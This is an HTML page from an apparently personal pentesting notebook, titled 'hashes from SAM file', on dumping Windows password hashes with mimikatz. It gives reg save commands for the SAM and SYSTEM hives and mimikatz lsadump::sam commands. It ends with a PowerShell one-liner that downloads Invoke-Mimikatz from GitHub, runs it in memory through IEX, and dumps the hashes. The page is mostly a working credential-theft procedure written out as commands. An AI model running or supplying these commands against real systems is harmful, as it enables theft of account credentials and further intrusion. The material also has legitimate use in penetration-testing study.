<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>hashes from SAM file</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>hashes from SAM file</h1><br/><strong>Prerequisites:</strong><br />â€¢ administrator<br /><br />We can use mimikatz dump the hashes from the SAM file, like we do with <a href="tion--Windows_Privilege_Escalation--4._Passwords--Dump_&_Crack_the_Hashes--Passowrds_Dumping_Tools--Remotely--smart_hashdump_(metasploit).html">smart_hashdump</a> of meterpreter.<br />Remember that pull hashes from the SAM file(file system&#39;s Registry) is safer than pulling them from LSASS memory.<br /><br />1. Before run mimikatz we have to save the SAM and SYSTEM file<br />    <div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>system <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\SYSTEM&quot;</span><br /><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>sam <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\SAM&quot;</span></pre></div><br />2. Now from mimikatz<br />    <div class="codebox"><pre>mimikatz# privilege::debug<br />mimikatz# lsadump::sam<br />mimikatz# lsadump::sam /sam:&lt;SAM-file&gt; /system:&lt;SYSTEM-file&gt;              #to save the files</pre></div><br />    <span style="color:#a52a2a;">example 1:</span><br />    <a href=""><img src="images/1194-1.png" alt="images/1194-1.png" /></a><br /><br />    <span style="color:#a52a2a;">example 2:</span><br />    <a href=""><img src="images/1194-2.png" alt="images/1194-2.png" /></a><br /><strong><h3>One-liner</h3></strong><br /><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">PS</span>&gt; reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>system <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\SYSTEM&quot;</span>;reg save hklm<span style="color:#ff9d00;font-weight:700">\</span>sam <span style="color:#3ad900;font-weight:400">&quot;$env:userprofile\desktop\SAM&quot;</span>;<span style="color:#ff9d00;font-weight:700">IEX</span>(<span style="color:#ff9d00;font-weight:700">New-Object</span> Net.WebClient).DownloadString(<span style="color:#3ad900;font-weight:400">&quot;https://raw.githubusercontent.com/BC-SECURITY/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1 &quot;</span>);<span style="color:#00117f;font-weight:400">Invoke-Mimikatz</span> <span style="color:#ff9d00;font-weight:700">-</span>Command <span style="color:#333333;font-weight:400">&#39;&quot;privilege::debug&quot; &quot;lsadump::sam /sam:%userprofile%\desktop\SAM /system:%userprofile%\desktop\SYSTEM&quot;&#39;</span></pre></div><br />    <a href=""><img src="images/1194-3.png" alt="images/1194-3.png" /></a></div>
</body>
</html>
